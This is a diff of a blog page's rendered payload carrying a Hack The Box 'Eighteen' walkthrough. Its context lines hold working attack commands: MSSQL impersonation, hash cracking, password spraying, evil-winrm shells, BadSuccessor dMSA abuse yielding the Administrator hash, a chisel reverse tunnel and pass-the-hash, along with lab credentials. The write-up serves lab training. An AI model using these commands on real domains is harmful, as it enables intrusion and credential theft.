@@ -1,18 +1,19 @@
 1:"$Sreact.fragment"
-2:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],""]
-3:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ThemeToggle"]
-4:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"MobileNavigation"]
-f:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ArticleReadingGuide"]
-11:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ThemeAutoReset"]
-13:I[484,[],"OutletBoundary"]
-14:"$Sreact.suspense"
-0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L3",null,{}],["$","$L2",null,{"className":"utility-link","href":"/contact#professional-enquiries","children":["Contact Abdullah ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"items":[{"label":"About","href":"/about"},{"label":"Projects","href":"/projects"},{"label":"Research","href":"/research"},{"label":"Writing","href":"/writing"},{"label":"Services","href":"/services"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","data-motion":"hero","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Eighteen Walkthrough"}],["$","p",null,{"className":"article-dek","children":"MSSQL impersonation exposes a crackable application hash for a WinRM foothold, then BadSuccessor dMSA abuse turns delegated OU creation rights into the Administrator hash and a privileged shell."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T15:31:20.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[12," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-eighteen-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Eighteen machine avatar","loading":"lazy","decoding":"async","fetchPriority":"low"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Eighteen machine artwork, used for identification. Hack The Box is not affiliated with CyberKareem."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/eighteen","target":"_blank","rel":"nofollow noopener noreferrer","children":["Official Hack The Box machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","data-motion":"section","children":[["$","aside",null,{"className":"article-context","aria-label":"Article context","children":["$L5","$L6","$L7",["$L8","$L9"]]}],"$La"]}]]}],null,"$Lb"]}],"$Lc","$Ld"],null,"$Le"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"DK8DoHECLNCy57ryKFrJF"}
-5:["$","$Lf",null,{"headings":[{"id":"summary","label":"Summary"},{"id":"credentials-and-flags-summary","label":"Credentials & Flags Summary"},{"id":"exploit-chain-overview","label":"Exploit Chain Overview"},{"id":"step-1-reconnaissance-nmap","label":"Step 1: Reconnaissance (Nmap)"},{"id":"step-2-mssql-enumeration-and-impersonation","label":"Step 2: MSSQL Enumeration & Impersonation"},{"id":"step-3-hash-extraction-and-cracking","label":"Step 3: Hash Extraction & Cracking"},{"id":"step-4-rid-brute-force-and-user-enumeration","label":"Step 4: RID Brute Force & User Enumeration"},{"id":"step-5-winrm-access-user-flag","label":"Step 5: WinRM Access (User Flag)"},{"id":"step-6-badsuccessor-cve-2025-53779","label":"Step 6: BadSuccessor (CVE-2025-53779)"},{"id":"step-7-chisel-tunnel-for-kerberos","label":"Step 7: Chisel Tunnel for Kerberos"},{"id":"step-8-getst-and-administrator-hash-root-flag","label":"Step 8: getST & Administrator Hash (Root Flag)"},{"id":"key-techniques-and-lessons-learned","label":"Key Techniques & Lessons Learned"},{"id":"tools-used","label":"Tools Used"},{"id":"references","label":"References"}]}]
-6:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":"Technical source and supporting notes."}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/0e139c2744710c55e1c8cfa3976c33d793be10af/HTB-Eighteen.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision",["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep",", commit 0e139c274471",""]}]]]}]
-7:["$","div",null,{"className":"article-review-note article-review-lab-safety","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Eighteen, Windows, Medium",". Retirement verified ","12 Jul 2026","."," ","This walkthrough covers an authorized lab. Use these techniques only on systems you own or are explicitly authorized to test."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/eighteen","target":"_blank","rel":"nofollow noopener noreferrer","children":["View public machine page ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]
-8:["$","div","source-context-0",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source context"}],["$","p",null,{"children":"Based on Abdullah Kareem's public preparation notes and edited for clarity. Commands and technical claims remain tied to the documented lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
-9:["$","div","editorial-correction-1",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"19 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
-10:T6088,<p><strong>Difficulty:</strong> Medium<br><strong>OS:</strong> Windows Server 2025<br><strong>IP:</strong> 10.129.x.x (changes per spawn)<br><strong>Domain:</strong> eighteen.htb / DC01.eighteen.htb<br><strong>Category:</strong> Active Directory, MSSQL, CVE-2025-53779 (BadSuccessor)</p>
+2:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],""]
+3:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ThemeToggle"]
+4:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"MobileNavigation"]
+10:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ArticleReadingGuide"]
+12:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ThemeAutoReset"]
+14:I[484,[],"OutletBoundary"]
+15:"$Sreact.suspense"
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L3",null,{}],["$","$L2",null,{"className":"utility-link","href":"/contact#professional-enquiries","children":["Contact Abdullah ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"items":[{"label":"About","href":"/about"},{"label":"Projects","href":"/projects"},{"label":"Research","href":"/research"},{"label":"Writing","href":"/writing"},{"label":"Services","href":"/services"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","div",null,{"className":"article-hero-copy","data-motion":"hero","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Eighteen Walkthrough"}],["$","p",null,{"className":"article-dek","children":"MSSQL impersonation exposes a crackable application hash for a WinRM foothold, then BadSuccessor dMSA abuse turns delegated OU creation rights into the Administrator hash and a privileged shell."}],["$","aside",null,{"className":"article-signal-deck article-signal-deck-htb","data-article-signal-kind":"lab","data-motion-surface":"instrument","aria-label":"Article orientation","children":[null,[["$","div",null,{"className":"article-signal-lab-node","aria-hidden":"true","children":[["$","span",null,{}],["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}]]}],["$","div",null,{"className":"article-signal-heading article-signal-lab-identity","children":[["$","span",null,{"children":"Authorized retired lab"}],["$","strong",null,{"children":"Eighteen"}],"$L5","$L6"]}],"$L7","$L8"],null,null]}]]}],"$L9"]}],"$La","$Lb"]}],null,"$Lc"]}],"$Ld","$Le"],null,"$Lf"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"MVJfiMbnmqcLVn86bgJ_V"}
+5:["$","small",null,{"children":"Hack The Box machine record"}]
+6:["$","a",null,{"className":"article-signal-source","href":"https://www.hackthebox.com/machines/eighteen","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open public machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]
+7:["$","dl",null,{"className":"article-signal-metrics article-signal-lab-metrics","children":[["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Operating system"}],["$","dd",null,{"children":"Windows"}]]}],["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Difficulty"}],["$","dd",null,{"children":"Medium"}]]}],["$","div",null,{"className":"article-signal-metric article-signal-metric-lab-state","children":[["$","dt",null,{"children":"Machine state"}],["$","dd",null,{"children":"Retired"}]]}],["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Retirement verified"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-07-12","children":"12 Jul 2026"}]}]]}]]}]
+8:["$","p",null,{"className":"article-signal-byline","children":["Published ","11 Jun 2026"," · ","Abdullah Kareem"]}]
+9:["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-eighteen-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Eighteen machine avatar","loading":"lazy","decoding":"async","fetchPriority":"low"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Eighteen machine artwork, used for identification. Hack The Box is not affiliated with CyberKareem."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/eighteen","target":"_blank","rel":"nofollow noopener noreferrer","children":["Official Hack The Box machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]
+a:["$","div",null,{"className":"article-rule"}]
+11:T670f,<p><strong>Difficulty:</strong> Medium<br><strong>OS:</strong> Windows Server 2025<br><strong>IP:</strong> 10.129.x.x (changes per spawn)<br><strong>Domain:</strong> eighteen.htb / DC01.eighteen.htb<br><strong>Category:</strong> Active Directory, MSSQL, CVE-2025-53779 (BadSuccessor)</p>
 <hr>
 <hr>
 <h2 id="summary">Summary</h2>
@@ -35,7 +36,7 @@ f:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app
 <h3 id="why-is-badsuccessor-so-powerful">Why is BadSuccessor so powerful?</h3>
 <p>The vulnerability abuses a legitimate Windows Server 2025 feature designed to help organisations migrate service accounts. When a dMSA "succeeds" another account, the DC hands over the predecessor's credentials as part of the transition. The flaw is that <strong>any user with CreateChild on any OU</strong> can trigger this process for any account in the domain - including Domain Admins. <code>CreateChild</code> is a low-sensitivity permission that is commonly delegated, making this a trivially exploitable path to full domain compromise on any Server 2025 environment.</p>
 <h3 id="key-vulnerability-chain">Key Vulnerability Chain</h3>
-<pre><code>Weak SQL privilege model        -&gt; credential extraction
+<pre tabindex="0" aria-label="Code or terminal block 1"><code>Weak SQL privilege model        -&gt; credential extraction
 Reused corporate password       -&gt; domain user foothold
 Overly permissive OU delegation -&gt; full domain compromise (BadSuccessor)
 </code></pre>
@@ -96,7 +97,7 @@ Overly permissive OU delegation -&gt; full domain compromise (BadSuccessor)
 </tbody></table>
 <hr>
 <h2 id="exploit-chain-overview">Exploit Chain Overview</h2>
-<pre><code>[Given Creds: kevin:iNa2we6haRj2gaw!]
+<pre tabindex="0" aria-label="Code or terminal block 2"><code>[Given Creds: kevin:iNa2we6haRj2gaw!]
         |
         v
 [MSSQL Port 1433]
@@ -145,7 +146,7 @@ Overly permissive OU delegation -&gt; full domain compromise (BadSuccessor)
 
 <p>Run a port scan to identify exposed services.</p>
 <h3 id="commands">Commands</h3>
-<pre><code class="language-bash" data-language="bash"># Add host to /etc/hosts first
+<pre tabindex="0" aria-label="bash code or terminal block 3"><code class="language-bash" data-language="bash"># Add host to /etc/hosts first
 echo "10.129.X.X eighteen.htb dc01.eighteen.htb" | sudo tee -a /etc/hosts
 
 # Port scan
@@ -194,13 +195,13 @@ nmap -p 80,1433,5985 -sV 10.129.X.X
 <p>SQL Server allows users to impersonate other logins if explicitly granted. We check this with NetExec's <code>mssql_priv</code> module, which reveals <code>kevin can impersonate: appdev</code>.</p>
 <h3 id="commands-2">Commands</h3>
 <p><strong>Check impersonation privileges:</strong></p>
-<pre><code class="language-bash" data-language="bash">nxc mssql 10.129.X.X -u kevin -p 'iNa2we6haRj2gaw!' -M mssql_priv --localauth
+<pre tabindex="0" aria-label="bash code or terminal block 4"><code class="language-bash" data-language="bash">nxc mssql 10.129.X.X -u kevin -p 'iNa2we6haRj2gaw!' -M mssql_priv --localauth
 </code></pre>
 <p><strong>Connect and impersonate:</strong></p>
-<pre><code class="language-bash" data-language="bash">impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@10.129.X.X
+<pre tabindex="0" aria-label="bash code or terminal block 5"><code class="language-bash" data-language="bash">impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@10.129.X.X
 </code></pre>
 <p><strong>Inside mssqlclient:</strong></p>
-<pre><code class="language-sql" data-language="sql">-- Check available databases
+<pre tabindex="0" aria-label="sql code or terminal block 6"><code class="language-sql" data-language="sql">-- Check available databases
 SELECT name FROM sys.databases;
 -- Shows: master, tempdb, model, msdb, financial_planner
 
@@ -219,7 +220,7 @@ SELECT * FROM users;
 </code></pre>
 <h3 id="what-we-get">What we get</h3>
 <p>A row with <code>admin</code> user and a PBKDF2 hash:</p>
-<pre><code>pbkdf2:sha256:600000$AMtzte...$0673ad90a0b4afb19d662336...
+<pre tabindex="0" aria-label="Code or terminal block 7"><code>pbkdf2:sha256:600000$AMtzte...$0673ad90a0b4afb19d662336...
 </code></pre>
 <hr>
 <h2 id="step-3-hash-extraction-and-cracking">Step 3: Hash Extraction &amp; Cracking</h2>
@@ -228,7 +229,7 @@ SELECT * FROM users;
 <h3 id="why-we-need-the-converter">Why we need the converter</h3>
 <p>PBKDF2 hashes store the salt and hash in base64, but the raw hash from the DB uses hex encoding. The script converts between these formats.</p>
 <h3 id="pbkdf2-to-hashcat-py">Pbkdf2-to-hashcat.py</h3>
-<pre><code class="language-python" data-language="python">#!/usr/bin/env python3
+<pre tabindex="0" aria-label="python code or terminal block 8"><code class="language-python" data-language="python">#!/usr/bin/env python3
 import base64
 import sys
 
@@ -247,7 +248,7 @@ hash_base64 = base64.b64encode(hash_bytes).decode()
 print(f'{taa[1]}:{iterations}:{salt_base64}:{hash_base64}')
 </code></pre>
 <h3 id="commands-3">Commands</h3>
-<pre><code class="language-bash" data-language="bash"># Convert the hash format
+<pre tabindex="0" aria-label="bash code or terminal block 9"><code class="language-bash" data-language="bash"># Convert the hash format
 python3 pbkdf2-to-hashcat.py 'pbkdf2:sha256:600000$&lt;salt&gt;$&lt;hash&gt;' &gt; hsh
 
 # Crack with hashcat (mode 10900 = PBKDF2-HMAC-SHA256)
@@ -257,7 +258,7 @@ hashcat -m 10900 hsh /usr/share/seclists/Passwords/LeakedDatabases/rockyou.txt
 hashcat hsh --show
 </code></pre>
 
-<pre><code>admin:iloveyou1
+<pre tabindex="0" aria-label="Code or terminal block 10"><code>admin:iloveyou1
 </code></pre>
 <hr>
 <h2 id="step-4-rid-brute-force-and-user-enumeration">Step 4: RID Brute Force &amp; User Enumeration</h2>
@@ -266,10 +267,10 @@ hashcat hsh --show
 <h3 id="why-rid-brute-force">Why RID brute force</h3>
 <p>We need a list of valid domain usernames to spray our cracked password against. RID brute force enumerates all SIDs in the domain by incrementing the RID portion.</p>
 <h3 id="command">Command</h3>
-<pre><code class="language-bash" data-language="bash">nxc mssql 10.129.X.X -u kevin -p 'iNa2we6haRj2gaw!' --rid-brute --localauth
+<pre tabindex="0" aria-label="bash code or terminal block 11"><code class="language-bash" data-language="bash">nxc mssql 10.129.X.X -u kevin -p 'iNa2we6haRj2gaw!' --rid-brute --localauth
 </code></pre>
 <h3 id="key-users-found">Key users found</h3>
-<pre><code>EIGHTEEN\jamie.dunn
+<pre tabindex="0" aria-label="Code or terminal block 12"><code>EIGHTEEN\jamie.dunn
 EIGHTEEN\jane.smith
 EIGHTEEN\alice.jones
 EIGHTEEN\adam.scott      &lt;- this one works!
@@ -285,22 +286,22 @@ EIGHTEEN\Finance
 
 <p>Spray the cracked password <code>REDACTED</code> across all discovered users via WinRM. One account reuses this password.</p>
 <h3 id="commands-4">Commands</h3>
-<pre><code class="language-bash" data-language="bash"># Create user list file from rid-brute output
+<pre tabindex="0" aria-label="bash code or terminal block 13"><code class="language-bash" data-language="bash"># Create user list file from rid-brute output
 # Save usernames to users.txt (one per line)
 
 # Spray via WinRM
 crackmapexec winrm 10.129.X.X -u users.txt -p REDACTED --continue-on-success
 </code></pre>
 
-<pre><code>adam.scott:iloveyou1  -&gt;  Pwn3d!
+<pre tabindex="0" aria-label="Code or terminal block 14"><code>adam.scott:iloveyou1  -&gt;  Pwn3d!
 </code></pre>
 <h3 id="get-shell-and-user-flag">Get shell &amp; user flag</h3>
-<pre><code class="language-bash" data-language="bash">evil-winrm -u adam.scott -p REDACTED -i 10.129.X.X
+<pre tabindex="0" aria-label="bash code or terminal block 15"><code class="language-bash" data-language="bash">evil-winrm -u adam.scott -p REDACTED -i 10.129.X.X
 </code></pre>
-<pre><code class="language-powershell" data-language="powershell">type C:\Users\adam.scott\Desktop\user.txt
+<pre tabindex="0" aria-label="powershell code or terminal block 16"><code class="language-powershell" data-language="powershell">type C:\Users\adam.scott\Desktop\user.txt
 </code></pre>
 <h3 id="user-flag">User Flag</h3>
-<pre><code>88cfd[redacted]db02cf241a0a
+<pre tabindex="0" aria-label="Code or terminal block 17"><code>88cfd[redacted]db02cf241a0a
 </code></pre>
 <hr>
 <h2 id="step-6-badsuccessor-cve-2025-53779">Step 6: BadSuccessor (CVE-2025-53779)</h2>
@@ -319,7 +320,7 @@ crackmapexec winrm 10.129.X.X -u users.txt -p REDACTED --continue-on-success
 <li>Grant adam.scott full control over the dMSA</li>
 </ol>
 <h3 id="commands-in-evil-winrm">Commands (in evil-winrm)</h3>
-<pre><code class="language-powershell" data-language="powershell"># Upload the BadSuccessor module
+<pre tabindex="0" aria-label="powershell code or terminal block 18"><code class="language-powershell" data-language="powershell"># Upload the BadSuccessor module
 upload /home/kali/BadSuccessor.ps1 C:\Users\adam.scott\Documents\BadSuccessor.ps1
 
 # Import the module
@@ -338,7 +339,7 @@ BadSuccessor -mode exploit `
   -domain "eighteen.htb"
 </code></pre>
 <h3 id="expected-output">Expected output</h3>
-<pre><code>Creating dMSA at: LDAP://eighteen.htb/OU=Staff,DC=eighteen,DC=htb
+<pre tabindex="0" aria-label="Code or terminal block 19"><code>Creating dMSA at: LDAP://eighteen.htb/OU=Staff,DC=eighteen,DC=htb
 Successfully created and configured dMSA 'nory_dmsa'
 Object adam.scott can now impersonate Administrator
 </code></pre>
@@ -359,11 +360,11 @@ Object adam.scott can now impersonate Administrator
 <h3 id="why-we-need-a-tunnel">Why we need a tunnel</h3>
 <p>Kerberos uses <strong>port 88</strong> which is not directly accessible from our Kali machine. We need to tunnel through the victim machine using chisel reverse SOCKS proxy.</p>
 <h3 id="setup-kali-attacker">Setup: Kali (attacker)</h3>
-<pre><code class="language-bash" data-language="bash"># Start chisel server in reverse mode
+<pre tabindex="0" aria-label="bash code or terminal block 20"><code class="language-bash" data-language="bash"># Start chisel server in reverse mode
 chisel server -p 8080 --reverse
 </code></pre>
 <h3 id="setup-victim-evil-winrm">Setup: Victim (evil-winrm)</h3>
-<pre><code class="language-powershell" data-language="powershell"># Upload chisel (must match version on Kali!)
+<pre tabindex="0" aria-label="powershell code or terminal block 21"><code class="language-powershell" data-language="powershell"># Upload chisel (must match version on Kali!)
 upload /usr/bin/chisel chisel.exe
 
 # Connect back to our server, expose SOCKS on port 1080
@@ -371,11 +372,11 @@ upload /usr/bin/chisel chisel.exe
 </code></pre>
 <h3 id="configure-proxychains">Configure proxychains</h3>
 <p>Edit <code>/etc/proxychains4.conf</code> - ensure the ProxyList section has:</p>
-<pre><code>[ProxyList]
+<pre tabindex="0" aria-label="Code or terminal block 22"><code>[ProxyList]
 socks5 127.0.0.1 1080
 </code></pre>
 <h3 id="verify-tunnel-works">Verify tunnel works</h3>
-<pre><code class="language-bash" data-language="bash">proxychains nmap -p 88 10.129.X.X
+<pre tabindex="0" aria-label="bash code or terminal block 23"><code class="language-bash" data-language="bash">proxychains nmap -p 88 10.129.X.X
 # Should show port 88 open
 </code></pre>
 <hr>
@@ -383,18 +384,18 @@ socks5 127.0.0.1 1080
 
 <p>Use impacket's <code>getST</code> with the <code>-dmsa</code> and <code>-self</code> flags to request a Kerberos ticket as our dMSA. The DC's response includes the <strong>previous encryption keys</strong> for the dMSA's predecessor (Administrator). This leaks the Administrator's NTLM hash directly.</p>
 <h3 id="fix-time-sync-required-for-kerberos">Fix time sync (required for Kerberos)</h3>
-<pre><code class="language-bash" data-language="bash"># Disable NTP auto-sync first, then set time from DC
+<pre tabindex="0" aria-label="bash code or terminal block 24"><code class="language-bash" data-language="bash"># Disable NTP auto-sync first, then set time from DC
 sudo timedatectl set-ntp false
 sudo timedatectl set-time "$(date -d "$(curl -s -I http://10.129.X.X | grep -i '^Date:' | cut -d' ' -f2-)" '+%Y-%m-%d %H:%M:%S')"
 </code></pre>
 <h3 id="request-the-ticket">Request the ticket</h3>
-<pre><code class="language-bash" data-language="bash">proxychains impacket-getST eighteen.htb/adam.scott:iloveyou1 \
+<pre tabindex="0" aria-label="bash code or terminal block 25"><code class="language-bash" data-language="bash">proxychains impacket-getST eighteen.htb/adam.scott:iloveyou1 \
   -impersonate "nory_dmsa\$" \
   -dc-ip 10.129.X.X \
   -self -dmsa
 </code></pre>
 <h3 id="output-breakdown">Output breakdown</h3>
-<pre><code>[*] Getting TGT for user
+<pre tabindex="0" aria-label="Code or terminal block 26"><code>[*] Getting TGT for user
 [*] Impersonating nory_dmsa$
 [*] Requesting S4U2self
 [*] Current keys:
@@ -408,12 +409,12 @@ sudo timedatectl set-time "$(date -d "$(curl -s -I http://10.129.X.X | grep -i '
 <p><strong>Key insight:</strong> The <code>Previous keys</code> section contains the Administrator's RC4/NTLM hash. This is because the dMSA is treated as the "successor" to Administrator - the DC hands over the predecessor's keys as part of the dMSA credential handoff mechanism.</p>
 </blockquote>
 <h3 id="get-root-shell-pass-the-hash">Get root shell (Pass-the-Hash)</h3>
-<pre><code class="language-bash" data-language="bash">evil-winrm -u administrator -H REDACTED_HASH_OR_FLAG -i 10.129.X.X
+<pre tabindex="0" aria-label="bash code or terminal block 27"><code class="language-bash" data-language="bash">evil-winrm -u administrator -H REDACTED_HASH_OR_FLAG -i 10.129.X.X
 </code></pre>
-<pre><code class="language-powershell" data-language="powershell">type C:\Users\Administrator\Desktop\root.txt
+<pre tabindex="0" aria-label="powershell code or terminal block 28"><code class="language-powershell" data-language="powershell">type C:\Users\Administrator\Desktop\root.txt
 </code></pre>
 <h3 id="root-flag">Root Flag</h3>
-<pre><code>9385[redacted]5e5488cf8
+<pre tabindex="0" aria-label="Code or terminal block 29"><code>9385[redacted]5e5488cf8
 </code></pre>
 <hr>
 <h2 id="key-techniques-and-lessons-learned">Key Techniques &amp; Lessons Learned</h2>
@@ -439,7 +440,7 @@ sudo timedatectl set-time "$(date -d "$(curl -s -I http://10.129.X.X | grep -i '
 <p>The <code>-dmsa</code> flag in impacket's getST tells it to perform the dMSA-specific S4U2self flow, which returns the predecessor's credentials. The <code>-self</code> flag requests the ticket for the account itself (no service specified). The NTLM hash appears in plaintext in the output - no secretsdump required.</p>
 <h3 id="8-clock-skew-with-kerberos">8. Clock Skew with Kerberos</h3>
 <p>Kerberos requires clocks to be within 5 minutes of the DC. sync before running Kerberos tools:</p>
-<pre><code class="language-bash" data-language="bash">sudo timedatectl set-ntp false
+<pre tabindex="0" aria-label="bash code or terminal block 30"><code class="language-bash" data-language="bash">sudo timedatectl set-ntp false
 sudo timedatectl set-time "$(date -d "$(curl -s -I http://&lt;DC_IP&gt; | grep -i '^Date:' | cut -d' ' -f2-)" '+%Y-%m-%d %H:%M:%S')"
 </code></pre>
 <p>If that fails (NTP locked), use <code>faketime</code> prefix on the command instead.</p>
@@ -499,9 +500,9 @@ sudo timedatectl set-time "$(date -d "$(curl -s -I http://&lt;DC_IP&gt; | grep -
